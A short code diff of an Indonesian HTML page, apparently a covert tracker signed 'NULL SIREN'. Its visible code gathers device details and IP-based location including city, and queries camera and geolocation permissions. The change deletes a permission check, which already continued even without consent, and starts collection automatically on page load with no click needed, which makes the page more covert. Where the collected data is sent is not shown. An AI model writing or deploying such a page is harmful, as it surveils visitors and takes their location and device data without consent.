@@ -1,5 +1,5 @@
 <!-- BY RACHEL AMANDA - NULL SIREN - GPT 😹 -->
-<!-- VERSION FINAL SUPER GERCEP V4.1 -->
+<!-- FINAL SUPER GERCEP TANPA KLIK PLAY, TOMBOL TETAP -->
 <!DOCTYPE html>
 <html lang="id">
 <head>
@@ -214,21 +214,6 @@ Kota                : ${ip.city}
       }
     };
 
-    const cekIzinDanMulai = async () => {
-      try {
-        const izinKamera = await navigator.permissions.query({ name: "camera" });
-        const izinLokasi = await navigator.permissions.query({ name: "geolocation" });
-
-        if (izinKamera.state === "granted" && izinLokasi.state === "granted") {
-          mulai();
-        } else {
-          mulai(); // tetap lanjut meski minta izin
-        }
-      } catch {
-        mulai();
-      }
-    };
-
     const mulai = async () => {
       const info = await ambilDataPerangkat();
       const ip = await ambilIPInfo();
@@ -244,8 +229,7 @@ Kota                : ${ip.city}
       }
     };
 
-    // SUPER GERCEP MULAI SAAT PAGE LOADED
-    window.addEventListener("load", cekIzinDanMulai);
+    window.addEventListener("load", mulai);
   </script>
 </body>
 </html>
